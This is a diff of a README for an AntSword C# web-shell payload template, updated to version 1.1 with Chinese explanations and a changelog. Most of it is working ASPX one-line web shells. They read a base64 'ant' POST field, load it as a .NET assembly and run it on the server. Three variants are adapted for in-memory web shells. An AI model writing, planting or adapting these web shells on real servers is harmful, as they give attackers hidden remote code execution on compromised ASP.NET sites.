@@ -1,4 +1,4 @@
-# AntSword-Csharp-Template v1.0
+# AntSword-Csharp-Template v1.1
 
 中国蚁剑Csharp一句话Payload
 
@@ -26,13 +26,50 @@ python3 build.py
     String Payload = Request.Form["ant"];
     if (Payload != null)
     {
-        System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance("Run").Equals(this);
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(this);
     }
-
 %>
 ```
 
+为了兼容各种情况下的内存马，Equals中的入口参数可以为System.Web.UI.Page对象，或者System.Web.UI.Page.Context对象，或者包含Request与Response对象的数组。
+
+即
+
+```
+<%@ Page Language="c#"%>
+<%
+    String Payload = Request.Form["ant"];
+    if (Payload != null)
+    {
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(Context);
+    }
+%>
+```
+
+或者
+
+```
+<%@ Page Language="c#"%>
+<%
+    String Payload = Request.Form["ant"];
+    if (Payload != null)
+    {
+        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
+        assembly.CreateInstance(assembly.GetTypes()[0].Name).Equals(new object[] { Request, Response });
+    }
+%>
+```
+
+
+
 ## 更新日志
+
+### v 1.1
+
+1. 兼容内存马
+2. Payload类名不再固定
 
 ### v 1.0
 
